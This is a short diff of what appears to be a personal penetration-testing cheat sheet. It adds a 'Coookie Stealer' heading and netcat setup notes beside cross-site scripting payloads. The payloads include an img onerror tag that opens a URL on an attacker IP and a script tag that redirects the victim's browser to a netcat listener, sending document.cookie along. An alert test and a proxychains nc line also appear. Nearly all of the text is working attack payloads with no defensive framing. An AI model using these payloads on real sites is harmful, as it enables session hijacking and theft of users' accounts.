@@ -57,7 +57,9 @@ proxychains nc (targetip) (taget port)
 ### Cross-site scripting (XSS)
         <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
         setup nc -l on machine
+#### Coookie Stealer
         <script>document.location="http://<ip of nc listener:port>/Cookie_Stealer1.php?username=" + document.cookie;</script>
+set up nc 
 ### stored javascript components 
         <script>alert('XSS');</script>
 ### ../
